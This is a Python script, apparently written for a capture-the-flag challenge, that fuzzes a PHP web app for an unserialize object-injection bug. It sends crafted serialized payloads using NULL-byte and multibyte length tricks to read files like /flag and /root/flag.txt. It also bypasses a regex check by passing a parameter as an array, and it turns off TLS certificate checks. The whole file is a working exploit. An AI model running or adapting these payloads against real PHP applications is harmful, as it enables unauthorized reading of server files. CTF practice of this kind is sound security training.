"""Precise fuzzer: PHP7.4 lenient unserialize via ] truncation + tail padding.

Goal: extract string = valid read_file object (start=gxngxngxn, filename=/flag)
plus trailing garbage that PHP ignores. The 1-byte gap from dropped ']' must be
absorbed by making s:LEN match via crafted value.
"""
import html
import re
import ssl
import urllib.parse
import urllib.request
import urllib3

urllib3.disable_warnings()
BASE = "https://8c26f6b1-6c7a-40c5-86ca-605b5c7c2819.challenge.ctf.show/"
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

PATHS = ["/flag", "/flag.txt", "/f1ag", "/fl4g", "/flag.php", "/var/www/html/flag.txt",
         "/var/www/flag.txt", "/tmp/flag.txt", "/root/flag.txt", "/home/flag.txt"]


def probe(start, read="I_want_to_Read_flag"):
    params = urllib.parse.urlencode({"start": start, "read": read})
    req = urllib.request.Request(BASE + "?" + params, headers={"User-Agent": "Mozilla/5.0"})
    try:
        resp = urllib.request.urlopen(req, timeout=25, context=CTX)
        body = resp.read().decode("utf-8", errors="replace")
        text = html.unescape(re.sub(r"<[^>]+>", "", body))
        marker = "What you are reading is:"
        idx = text.rfind(marker)
        if idx >= 0:
            return text[idx + len(marker):].strip()[:160]
        return None
    except Exception as e:
        return f"ERR:{str(e)[:60]}"


def main():
    print("=== phase 1: tail-after-] padding ===")
    # start = inject + ']' + tail ; extract ends at FIRST ], tail excluded
    # but if no ']' inside value, extract = full serialize. So tail after ] is irrelevant.
    # phase 2: NULL byte inside value before ] — serialize emits \0 (2 chars, LEN counts 1)
    print("=== phase 2: NULL-byte value tricks ===")
    for path in PATHS:
        inj = 'gxngxngxn";s:8:"filename";s:%d:"%s";}' % (len(path), path)
        variants = [
            inj + "\x00]",
            inj + "\x00\x00]",
            "gxngxngxn\x00];s:8:\"filename\";s:%d:\"%s\";}" % (len(path), path),
            "gxngxngxn\x00];" + 's:8:"filename";s:%d:"%s";}' % (len(path), path),
        ]
        for v in variants:
            r = probe(v)
            if r and not r.startswith("root"):
                print(f"[!] path={path} resp={r}")
                return
    print("  no hit")

    print("=== phase 3: multibyte char before ] ===")
    for path in ["/flag", "/flag.txt"]:
        inj = 'gxngxngxn";s:8:"filename";s:%d:"%s";}' % (len(path), path)
        for mb in ["中", "中中", "😀", "é"]:
            for pos in [0, 1, 2]:
                v = inj[:len(inj)-1] + mb + "}" if pos == 2 else inj + mb + "]"
                if pos != 2:
                    v = inj + mb * (pos + 1) + "]"
                r = probe(v)
                if r and not r.startswith("root"):
                    print(f"[!] path={path} mb={mb} pos={pos} resp={r}")
                    return
    print("  no hit")

    print("=== phase 4: read param as array (regex bypass) + truncation ===")
    # array read => $read='Array', preg_match bypassed
    for path in ["/flag", "/flag.txt"]:
        inj = 'gxngxngxn";s:8:"filename";s:%d:"%s";}]' % (len(path), path)
        params = urllib.parse.urlencode([("start", inj), ("read", ["x"])])
        req = urllib.request.Request(BASE + "?" + params, headers={"User-Agent": "Mozilla/5.0"})
        try:
            resp = urllib.request.urlopen(req, timeout=25, context=CTX)
            body = resp.read().decode("utf-8", errors="replace")
            text = html.unescape(re.sub(r"<[^>]+>", "", body))
            idx = text.rfind("What you are reading is:")
            r = text[idx + len("What you are reading is:"):].strip()[:160] if idx >= 0 else None
            if r and not r.startswith("root"):
                print(f"[!] path={path} arr-resp={r}")
                return
        except Exception as e:
            print(f"  err {str(e)[:40]}")
    print("  no hit")
    print("done")


if __name__ == "__main__":
    main()
